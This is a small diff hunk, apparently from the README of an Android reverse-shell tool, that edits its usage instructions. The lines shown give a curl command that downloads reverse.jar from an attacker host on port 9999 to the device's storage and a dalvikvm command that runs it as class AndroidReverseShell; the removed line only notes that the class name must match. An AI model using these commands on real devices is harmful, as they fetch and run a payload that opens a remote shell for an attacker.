@@ -27,8 +27,6 @@ or you can just use dalvikvm from Termux:
 `curl http://attackingmachine:9999/reverse.jar -o /sdcard/reverse.jar`<br/>
 `cd /system/bin/ && ./dalvikvm -cp /sdcard/reverse.jar AndroidReverseShell`
 
-("AndroidReverseShell" this class name must be the same used before, otherwise it fails!)
-
 You can of course create a pure .apk package and sign it using Android Studio or apktool and apksigner.
 
 ## Todo
